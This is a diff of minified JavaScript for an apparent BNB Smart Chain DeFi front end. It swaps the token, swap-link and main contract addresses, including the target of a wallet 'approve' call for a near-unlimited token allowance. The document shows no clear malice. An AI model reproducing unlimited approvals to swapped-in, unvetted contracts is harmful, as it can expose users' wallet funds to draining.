@@ -315,7 +315,7 @@
 								color: "primary",
 								fullWidth: !0,
 								onClick: function(e) {
-									e.preventDefault(), window.location.href = "https://pancakeswap.finance/swap?outputCurrency=0xa1bb1acc376718fd17bd449a3121c25a26a4d974"
+									e.preventDefault(), window.location.href = "https://pancakeswap.finance/swap?outputCurrency=0x51626AD5346e7Be227D8341204a0447077963481"
 								},
 								children: "Swap"
 							})
@@ -374,8 +374,8 @@
 			var K = n(408),
 				N = n(409),
 				q = 56,
-				X = "0xA2c0c4a842B84aFeBffe05A59F3ffc754AAD1ae4",
-				_ = "https://www.bscscan.com/address/0xA2c0c4a842B84aFeBffe05A59F3ffc754AAD1ae4",
+				X = "0xF9a4FF6CA0d31856C6fb300735986C71bdD16B7e",
+				_ = "https://www.bscscan.com/address/0xF9a4FF6CA0d31856C6fb300735986C71bdD16B7e",
 				$ = Object(a.createContext)({
 					busdcontract: null,
 					contract: null,
@@ -426,7 +426,7 @@
 					}), [p]);
 					var j = new g.a;
 					j.setProvider(g.a.givenProvider);
-					var x = new j.eth.Contract(K, "0xA1Bb1Acc376718fd17bD449a3121c25A26a4d974");
+					var x = new j.eth.Contract(K, "0x51626AD5346e7Be227D8341204a0447077963481");
 					return Object(C.jsx)($.Provider, {
 						value: {
 							web3: u,
@@ -599,7 +599,7 @@
 							return A.a.wrap((function(e) {
 								for (;;) switch (e.prev = e.next) {
 									case 0:
-										return L(!0), "0xA2c0c4a842B84aFeBffe05A59F3ffc754AAD1ae4", e.prev = 2, e.next = 5, t.methods.approve("0xA2c0c4a842B84aFeBffe05A59F3ffc754AAD1ae4", "1000000000000000000000000000000").send({
+										return L(!0), "0xF9a4FF6CA0d31856C6fb300735986C71bdD16B7e", e.prev = 2, e.next = 5, t.methods.approve("0xF9a4FF6CA0d31856C6fb300735986C71bdD16B7e", "1000000000000000000000000000000").send({
 											from: b
 										});
 									case 5:
